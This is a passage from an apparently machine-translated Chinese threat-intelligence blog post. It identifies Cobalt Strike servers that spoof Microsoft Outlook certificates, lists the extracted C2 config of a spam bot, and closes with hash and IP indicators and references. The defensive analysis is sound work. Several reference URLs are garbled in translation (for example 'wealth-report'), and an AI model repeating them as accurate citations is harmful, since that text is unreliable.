cert扫描范围</a>编写了一个工具，我们可以在这里使用它来扫描整个范围，寻找这个演员基础设施。</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="5285" class="kc kd hs jy b fi ke kf l kg kh">4a08189c6f97c3b9a424f1f18c5c4356beaf1b3e<br/>IP: 31.44.184.181 - &lt;Name(C=US,ST=Washington,L=Redmond,O=Microsoft Corporation,OU=Microsoft Corporation,CN=Outlook.live.com)&gt;</span><span id="6cef" class="kc kd hs jy b fi ki kf l kg kh">4a08189c6f97c3b9a424f1f18c5c4356beaf1b3e<br/>IP: 31.44.184.165 - &lt;Name(C=US,ST=Washington,L=Redmond,O=Microsoft Corporation,OU=Microsoft Corporation,CN=Outlook.live.com)&gt;</span><span id="f027" class="kc kd hs jy b fi ki kf l kg kh">4a08189c6f97c3b9a424f1f18c5c4356beaf1b3e<br/>IP: 31.44.184.84 - &lt;Name(C=US,ST=Washington,L=Redmond,O=Microsoft Corporation,OU=Microsoft Corporation,CN=Outlook.live.com)&gt;</span><span id="2ad2" class="kc kd hs jy b fi ki kf l kg kh">4a08189c6f97c3b9a424f1f18c5c4356beaf1b3e<br/>IP: 31.44.184.100 - &lt;Name(C=US,ST=Washington,L=Redmond,O=Microsoft Corporation,OU=Microsoft Corporation,CN=Outlook.live.com)&gt;</span><span id="ff8f" class="kc kd hs jy b fi ki kf l kg kh">4a08189c6f97c3b9a424f1f18c5c4356beaf1b3e<br/>IP: 31.44.184.74 - &lt;Name(C=US,ST=Washington,L=Redmond,O=Microsoft Corporation,OU=Microsoft Corporation,CN=Outlook.live.com)&gt;</span><span id="4f29" class="kc kd hs jy b fi ki kf l kg kh">4a08189c6f97c3b9a424f1f18c5c4356beaf1b3e<br/>IP: 31.44.184.82 - &lt;Name(C=US,ST=Washington,L=Redmond,O=Microsoft Corporation,OU=Microsoft Corporation,CN=Outlook.live.com)&gt;</span><span id="bf43" class="kc kd hs jy b fi ki kf l kg kh">4a08189c6f97c3b9a424f1f18c5c4356beaf1b3e<br/>IP: 31.44.184.174 - &lt;Name(C=US,ST=Washington,L=Redmond,O=Microsoft Corporation,OU=Microsoft Corporation,CN=Outlook.live.com)&gt;</span><span id="3e63" class="kc kd hs jy b fi ki kf l kg kh">4a08189c6f97c3b9a424f1f18c5c4356beaf1b3e<br/>IP: 31.44.184.56 - &lt;Name(C=US,ST=Washington,L=Redmond,O=Microsoft Corporation,OU=Microsoft Corporation,CN=Outlook.live.com)&gt;</span><span id="1902" class="kc kd hs jy b fi ki kf l kg kh">4a08189c6f97c3b9a424f1f18c5c4356beaf1b3e<br/>IP: 31.44.184.73 - &lt;Name(C=US,ST=Washington,L=Redmond,O=Microsoft Corporation,OU=Microsoft Corporation,CN=Outlook.live.com)&gt;</span><span id="f6ca" class="kc kd hs jy b fi ki kf l kg kh">4a08189c6f97c3b9a424f1f18c5c4356beaf1b3e<br/>IP: 31.44.184.63 - &lt;Name(C=US,ST=Washington,L=Redmond,O=Microsoft Corporation,OU=Microsoft Corporation,CN=Outlook.live.com)&gt;</span></pre><p id="cf98" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">另一个范围:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="2cb9" class="kc kd hs jy b fi ke kf l kg kh">4a08189c6f97c3b9a424f1f18c5c4356beaf1b3e<br/>IP: 185.153.199.162 - &lt;Name(C=US,ST=Washington,L=Redmond,O=Microsoft Corporation,OU=Microsoft Corporation,CN=Outlook.live.com)&gt;</span><span id="3a12" class="kc kd hs jy b fi ki kf l kg kh">2a332c3a76f2bea5d458f33cf025db656983c72e<br/>IP: 185.153.199.161 - Empty</span><span id="0237" class="kc kd hs jy b fi ki kf l kg kh">733716db5a44d79a1a2881109f62060079b5b7a0<br/>IP: 185.153.199.167 - Empty</span><span id="1029" class="kc kd hs jy b fi ki kf l kg kh">21338c5fec99e8df6573b169fbb2f388b84f82ef<br/>IP: 185.153.199.165 - Empty</span><span id="f0d3" class="kc kd hs jy b fi ki kf l kg kh">4a08189c6f97c3b9a424f1f18c5c4356beaf1b3e<br/>IP: 185.153.199.163 - &lt;Name(C=US,ST=Washington,L=Redmond,O=Microsoft Corporation,OU=Microsoft Corporation,CN=Outlook.live.com)&gt;</span><span id="bc9a" class="kc kd hs jy b fi ki kf l kg kh">4a08189c6f97c3b9a424f1f18c5c4356beaf1b3e<br/>IP: 185.153.199.166 - &lt;Name(C=US,ST=Washington,L=Redmond,O=Microsoft Corporation,OU=Microsoft Corporation,CN=Outlook.live.com)&gt;</span><span id="ed97" class="kc kd hs jy b fi ki kf l kg kh">4a08189c6f97c3b9a424f1f18c5c4356beaf1b3e<br/>IP: 185.153.199.164 - &lt;Name(C=US,ST=Washington,L=Redmond,O=Microsoft Corporation,OU=Microsoft Corporation,CN=Outlook.live.com)&gt;</span></pre><p id="151a" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">“空的”是默认的CS管理员认证:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="a85b" class="kc kd hs jy b fi ke kf l kg kh">subject=C = Earth, ST = Cyberspace, L = Somewhere, O = cobaltstrike, OU = AdvancedPenTesting, CN = Major Cobalt Strike</span></pre><p id="8184" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">在其中一台CS服务器' 31.44.184.63 '上进行更多的旋转操作，会在VirusTotal上找到一个与之相关的有趣文件。</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="2cfb" class="kc kd hs jy b fi ke kf l kg kh">fe7d4cb5112f5ae0a3d0f9593e1954c60f771f14cc161acd9bdf2f91f2d3267a</span></pre><p id="7511" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">该文件是<a class="ae jn" href="https://lokalhost.pl/txt/peering.into.spam.botnets.VirusBulletin2017.pdf" rel="noopener ugc nofollow" target="_blank">安全发送垃圾邮件机器人</a>的打包样本。</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="ef40" class="kc kd hs jy b fi ke kf l kg kh">{'C2': '31.44.184.63:50001/50002', 'CONF': '31.44.184.63:50001/50002;Enterprise Mailing Service'}</span></pre><p id="2a67" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">发送安全垃圾邮件发送者也是此<a class="ae jn" href="https://lokalhost.pl/txt/peering.into.spam.botnets.VirusBulletin2017.pdf" rel="noopener ugc nofollow" target="_blank">威胁组</a>使用的已知实用程序。</p><h1 id="3be5" class="kl kd hs bd km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh bi translated">IOCs</h1><p id="dc4d" class="pw-post-body-paragraph ip iq hs ir b is li iu iv iw lj iy iz ja lk jc jd je ll jg jh ji lm jk jl jm ha bi translated">CS相关哈希:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="3127" class="kc kd hs jy b fi ke kf l kg kh">655346f41c456cefd9d40c1b9484f1c0dfa36d180c72dd2d1ada26661be1ca6d<br/>2d038b20eaf05bb8d673542f1dbab6a376abb05bf10d38b04f163cfd6c2a7252<br/>e2f686f17b73398d949998e46c7fde48d0507b324a811df39cdd91531deb3d89<br/>d08131d236658401c8de489596ee83992058f05176cbd8b72add89fcea57e37c<br/>bd3c278309e4fe19f7b424ee0b56a1a2c0bbae3a59882d5b6f171d3ca89f728b</span></pre><p id="cce2" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">IPs:</p><pre class="jp jq jr js fd jx jy jz ka aw kb bi"><span id="3eb9" class="kc kd hs jy b fi ke kf l kg kh">31.44.184.181<br/>31.44.184.165<br/>31.44.184.84<br/>31.44.184.100<br/>31.44.184.74<br/>31.44.184.82<br/>31.44.184.174<br/>31.44.184.56<br/>31.44.184.73<br/>31.44.184.63<br/>185.153.199.162<br/>185.153.199.161<br/>185.153.199.167<br/>185.153.199.165<br/>185.153.199.163<br/>185.153.199.166<br/>185.153.199.164</span></pre><h1 id="593a" class="kl kd hs bd km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh bi translated">参考</h1><p id="da1c" class="pw-post-body-paragraph ip iq hs ir b is li iu iv iw lj iy iz ja lk jc jd je ll jg jh ji lm jk jl jm ha bi translated"><a class="ae jn" href="https://vixra.org/abs/1902.0257" rel="noopener ugc nofollow" target="_blank">https://vixra.org/abs/1902.0257</a><br/><a class="ae jn" href="https://www.blueliv.com/downloads/network-insights-into-vawtrak-v2.pdf" rel="noopener ugc nofollow" target="_blank">https://www . blue liv . com/downloads/network-insights-in-vawtrak-v2 . pdf</a><br/><a class="ae jn" href="https://www.proofpoint.com/sites/default/files/pfpt-us-tr-q117-threat-report.pdf" rel="noopener ugc nofollow" target="_blank">https://www . proofpoint . com/sites/default/files/pfpt-us-tr-q117-wealth-report . pdf</a></p><p id="fdfd" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated"><a class="ae jn" href="https://isc.sans.edu/forums/diary/Hancitor+infection+with+Pony+Evil+Pony+Ursnif+and+Cobalt+Strike/25532/" rel="noopener ugc nofollow" target="_blank">https://isc . sans . edu/forums/diary/hanci tor+infection+with+Pony+Evil+Pony+Ursnif+and+Cobalt+Strike/25532/</a><br/><a class="ae jn" href="https://app.any.run/tasks/5d21ab13-70fb-4ccf-8a80-545d19c7d20f/" rel="noopener ugc nofollow" target="_blank">https://app . any . run/tasks/5d 21 ab 13-70fb-4c cf-8a 80-545d 19 c 7d 20 f/</a><br/><a class="ae jn" href="https://www.malware-traffic-analysis.net/2020/10/20/index.html" rel="noopener ugc nofollow" target="_blank">https://www . malware-traffic-analysis . net/2020/10/20</a></p><p id="f656" class="pw-post-body-paragraph ip iq hs ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated"><a class="ae jn" href="https://lokalhost.pl/txt/peering.into.spam.botnets.VirusBulletin2017.pdf" rel="noopener ugc nofollow" target="_blank">https://lokalhost . pl/txt/peering . into . spam . botnets . virus bulletin 2017 . pdf</a></p></div></div>    
</body>
</html>